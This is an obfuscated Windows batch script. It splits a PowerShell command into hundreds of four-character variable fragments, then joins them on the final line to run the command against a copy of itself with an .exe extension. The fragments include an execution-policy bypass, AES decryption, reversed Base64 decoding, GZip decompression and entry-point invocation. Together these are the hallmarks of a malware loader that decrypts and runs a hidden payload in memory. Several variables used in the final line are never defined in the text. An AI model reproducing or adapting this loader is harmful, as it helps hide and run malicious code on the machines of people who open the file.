@echo off
set "ZRYhVbaWzb=jKPK"
set "YijrQkMnbC=hy.A"
set "kwwntawdwO='dqR"
set "LdFlieqfhP=File"
set "yotXSNhxkk=d = "
set "DECShRVSQg='txe"
set "cmHbNSpqzM=kTpo"
set "SkeOowhXQK=S46e"
set "cAWgPaIdMe= = ["
set "RVQkITpjCQ=ress"
set "sDoUSyrnTM=)($M"
set "MpouMUhrrF=ddd."
set "qwkggVlYxi=e = "
set "KqHkJfSfUG=[Env"
set "oIdZcCKAQg=tion"
set "pcJIWrDtnd=g = "
set "jDkfHIkDGL=();$"
set "jDODDmdJTT=-joi"
set "qHlPCCqVnR=[]] "
set "yFKgNeBTqf=bjec"
set "nOFXXVxcbU=ode]"
set "STYwQgDymC=TllA"
set "PtQJIicCnu=Disp"
set "uiVWCqBntu='')("
set "rMCqSrPkyD=ct S"
set "RJatTKtbsA=UGTu"
set "imtZoFvIxI=v4Ir"
set "jUEKpEZFOm=V = "
set "TCDeJDAzHf=Syst"
set "avpqFjRCsB=yste"
set "ToYVQHMFWu=] -j"
set "ZxpMWWEjYG=ix.T"
set "NJtAVFWyfr=oryS"
set "tigqPnRcMi=ment"
set "gYqfdeHjGf=dnlG"
set "jighmbriut= '')"
set "RGRHkxWMas=fwkm"
set "TscIuPYiXN= New"
set "ukpjVMWGfB=f = "
set "hNVSzmUzrq=sFaM"
set "xoSTuAjWSr=comm"
set "mcVLlVVSlu=; };"
set "YDCjDIPnkq=ZYYc"
set "PGuMnODllS=fwkm"
set "ixobWjfYfQ=..-1"
set "IPoYvUuvpu=esMa"
set "TtKBJwltyz=zG);"
set "diyRFRYxFS=Disp"
set "yUbCbmKbNh=[Sys"
set "YGqMNVBuSD=$Ned"
set "qyxMPYasMr=K = "
set "sjikfXwBOo=($uD"
set "cVPZuszvYo=se()"
set "zKfhgMPdHt=tsWi"
set "DqBFzFuWiE=;$sF"
set "khhPOPshGj=  $M"
set "ziElgGYuRU=in $"
set "nPQtbrRkIw=zG.T"
set "SOcRGsLgpn=Secu"
set "tQAJzcweak=();$"
set "ZURgauosOi=Tpof"
set "zyHHluCLOi=Stre"
set "CRgZKdgwXe=-joi"
set "KvfNrpWfxf=lBlo"
set "rxIMBQrvFs=le  "
set "IzIuWXDZGW=-4] "
set "HcgINZXEFg=tryP"
set "ldHVvOsEOi=daeR"
set "JWYzTJXIEd=iYJh"
set "bZaQrYYSyi=3); "
set "puYnwPqpcN=[-1."
set "vLJpgzXGws=1] -"
set "HXKEzjUaRg=sJo "
set "TeQNqONJuY=ose("
set "nandzbrkhj=tem."
set "hLEMaWPhSH=vj0m"
set "TYWBkZeXmy=);$P"
set "zmSxTPPKOR=grap"
set "oDSkpKQUzZ= = $"
set "aKnTksJqWe=('%*'"
set "dnoergnhaP=stem"
set "QmXoCbNbHF=am;$"
set "zDGGdgoTPI=e]::"
set "nhxcmtnjbW=ke($"
set "HwyrCZquCo=$kTp"
set "qvNckMHumz=);$d"
set "VAVtLohRQk=Fo7l"
set "vvPmEaACfm=m.Pa"
set "vkxzRUvvBn=orF'"
set "izWNdmTDhA=iYJh"
set "aHmLJHNusw=ck($"
set "QEnuuKyYKB=saBm"
set "xrKUtzlndl=form"
set "NlWTSYBqqa=New-"
set "HvzJCAvdtI=pDZz"
set "KmirYnIjtp=stem"
set "cWckUoPtYw=qix "
set "JVcyJHgiMg===')"
set "GvKWICzRxh=736u"
set "gTMPVRdURA=7Yiv"
set "SgCvRAbHzP=th('"
set "vBpPbWpNIK=km.I"
set "fBpUIxLquT=onve"
set "KWfyYzCRrq=.GZi"
set "akcdCpIAEV=6] -"
set "UPGXfhyAly=mory"
set "epRTJyREbg=pStr"
set "HsIqpZaTVG=);$l"
set "RnOyQpNtpr=y.Ci"
set "ZPNwDdxlkw=:: '"
set "IUhALraYvQ=ress"
set "ekSmveHnfz=cAN."
set "tgCYrqjgHf=.Cry"
set "rKyUWUtqlG=.Mem"
set "zmliGMxgXe=..-1"
set "iTZyEvjuMs=Tpof"
set "wwIqCfvmZp=ach "
set "OMwfmFezvj=[IO."
set "xQKfTBIxMy=);$o"
set "jOZXhqRJhL=kTpo"
set "YeYdwYDmhl=fwkm"
set "XnvycQuamV=.Con"
set "oCyXbimhPQ=gnir"
set "AGnDLTsZRd=trea"
set "XxLyKvVilv=ress"
set "zreHAnMJvJ=join"
set "pmPTjJrLSi== [S"
set "OcRJytsdwk=m(, "
set "XOHJWPKxmI=-nop"
set "SNzLiOAZGE=.IO."
set "rryuCWyIUM=)))"
set "AyUDTZnMpK=7;$o"
set "DrfTmJdudO=.Dis"
set "JGrqBlTpdV=nage"
set "UVsskAhDDs=]::("
set "lmOJyVOapx=comp"
set "iUpKRRtGAI=).Sp"
set "twSFIOtzyn=Obje"
set "OTiuCtNTsU=qix."
set "AFPODmniDT=();$"
set "INZtijrQNc=Syst"
set "oTSGHllRWQ=ct S"
set "uLRBPutDWi=, (,"
set "tEnjNBEHeX==');"
set "kidtkEGdbd=fQzG"
set "oGvxhUUsEc=Mode"
set "zVfciWIvwg=$dnl"
set "LkWwjvCpWf=ecry"
set "ZxIHnVUgUc=ing("
set "dxhIFtApQe=ddin"
set "DhVPQRnfbM=]::N"
set "hcNvJqJzMn=tem."
set "OBNyoPUbak=rans"
set "EuEZVtSEbB= [Sy"
set "mTcUfMcKVP=zG ="
set "nXZzFupdQt=rofi"
set "lQZtOHshzu=Conv"
set "QpIXocuQRx=::('"
set "LSClWNNNDm= = N"
set "iSqzTNunra=GZ ="
set "dGLuaCkquw=ne);"
set "DaRnLvUDJY=ptog"
set "CuyiSKRKbB=$dfQ"
set "aLopZQNkCG=F'[-"
set "RJDMUVJnWh=$NAq"
set "LqgMZjOMMB=kTpo"
set "lDWyIoFetg=f = "
set "PVPArGNgne=wcAN"
set "cIyOzqiIkg=n ''"
set "xhpbOrNjKY=rity"
set "AOfrhNTSEu=.Cre"
set "tRgzAupZOZ=;$NA"
set "AEMzKaNLHs=raph"
set "LmkqXzYKqS=[Sys"
set "UWICtGoWze=bstr"
set "JAJmbNQTZH=('l0"
set "EylwoIuvGT=pose"
set "VUDxJLEypT=Star"
set "GeztwZJKQg=pose"
set "lVyvmTZMJt=em.C"
set "jYPduhAfXo=OyzA"
set "QRTtCxiiiS=pher"
set "wqsGHZYAzf=Secu"
set "yZwTnikewI=rity"
set "UMYJjgoCJU=aMp "
set "MJNnGOZIlo=em.I"
set "QQNRxZXJpH=$dfQ"
set "inOBODSFBa=sGUc"
set "eGziTATLxv=.Key"
set "yNAIZneyhY=p.En"
set "LDhfWFlVkA=ptor"
set "AylktoDtPq=raph"
set "ZeJjfxJYYo=.-16"
set "VObSFRIXIO=uDsJ"
set "FuASOExjan=m.IO"
set "PgHHElkkzi=ion."
set "oqUlaxeIjX=Invo"
set "HAoriIFSIV=BC;$"
set "HQyzrfqWlN=and "
set "RbJcugLQSk=Nedd"
set "EHueLjJakd= = $"
set "wqjJuHZnoJ=dd, "
set "vRRpSFAjCa=gth)"
set "SMkqLcEOmn=ateD"
set "dipHVREmFH=)) {"
set "MPrqoqlsxw=]::C"
set "fyqsSjmTOH=$PjK"
set "MkqZanfdvX=ispo"
set "bWttYrmIwl=nirt"
set "LEyeBSPyik=ay()"
set "IYdIMLxUjc=of);"
set "wjHGaJYTbZ=fwkm"
set "MzCikWNPZb= [st"
set "QbZJxPPlrW=Comp"
set "CLyDOnHXNR=k; }"
set "urmrnmJfds== $o"
set "daCSEHHzqf=1..-"
set "fvlXckSrqV=ofwk"
set "ERuVtNPGZm= '')"
set "jkwiTDoZOU=$dfQ"
set "lODCIVaaWj=$kTp"
set "CTVFFWoUCy=y]::"
set "vURkXFvwZq=Obje"
set "WAkMNfiwyR=.Sec"
set "rVBUBJBJdB=iron"
set "NeUHUfWKpt=;$Ne"
set "YlBDxlgaeL=[Sys"
set "BlBlSxaLDN=);$o"
set "eeihPExgaL=rtS4"
set "hyfwCyswed=.Dis"
set "JRwTSacFaa=Bmor"
set "IHvWOIIqpf=t Sy"
set "xHZXLDtHLF=O.Me"
set "jjJuGBjPKy=stem"
set "bmgMBNrwqC=bypa"
set "JfFsjkaMrQ=ert]"
set "lUxyDgpzab=urit"
set "nCqbfgHHrb=morF"
set "OvHVzpAwbd=of ="
set "nKBHyIoDpl=n ''"
set "JUQDLYFDui=join"
set "qaJRzbZWbe=oint"
set "GJLMnPOUrj=0O+g"
set "RxmiHcSNkV=ring"
set "lYJCFcwdUq=PKCS"
set "Slyhbfhxwu=null"
set "whAOTRpxhQ=tem."
set "mPLLkOsdpy=ddin"
set "qbfGWzeucj= [Sy"
set "CKuMtakPjH=sJo."
set "GKRpNVZhVm=::De"
set "gGAYsxZegO=Comp"
set "BsbxScBrvT=yste"
set "eQXsfFePjv=yste"
set "FATyZoeCLy=.Com"
set "wrAbiixJiJ=ypto"
set "iBtbwnHooP=16] "
set "nfYPQHfZZY=('da"
set "yLNWKlxshz=y.Cr"
set "HdHakJSkVI=ptog"
set "cLtHMmIfOK=isfL"
set "JVnZtZYTug=ionM"
set "FDPHqyHvoO=)($k"
set "XpPlMMTFvN=oL'["
set "SGTRdYhBay=pres"
set "wvCvlEqOVt=lit("
set "FFgoagBMdr='[-1"
set "RCfraWhbfM=esaB"
set "ctwlgdFGDf='gni"
set "gxMDdKUGGT=.Cop"
set "GQEetnpnzz=yTo("
set "RMvIBGTsof=;$NA"
set "DgPXkYrbqe=, $k"
set "uyQheGrSvd=vert"
set "ZXXpEKcBjs=-1.."
set "MfSGdOtVqs=eam("
%XRbumlRQlt%%qzoFkecPHq%%evGAThAESm%%qbCqfmevnv%%XtyvuSquBl%%iHvkICkAAe%%LnXZdoXXzY%%aGCmsKWlgb%%RfcHeJFsID%%bDVjJJwzsf%%VsUClBejRX%%GZuzmFkpVt%%IEpWWwLsCJ%%nwSafykAwC%%EwBKXcivWe%%yhEZwrdYGO%%PLHiJjhtuO%%uKTsOmdEYU%%oqwxkgSSEO%%vmUINSPtbO%%VPbiKOomkk%%nzaMAzpjXD%%roPFsiQlFV%%wKDkYzonNw%%SFIuAWlihn%%DGvxxGZvPB%%XdGoNDVQNb%%kbwBKLGufw%%WIdrsQofNr%%zTylyPZtHW%%avugdBjTNL%%aFqtFpZoVW%%oQcvCrDkdV%"%~dp0%~nx0.exe"
cls
%GAbEcuiBfM%%JsuOLrVWXA%
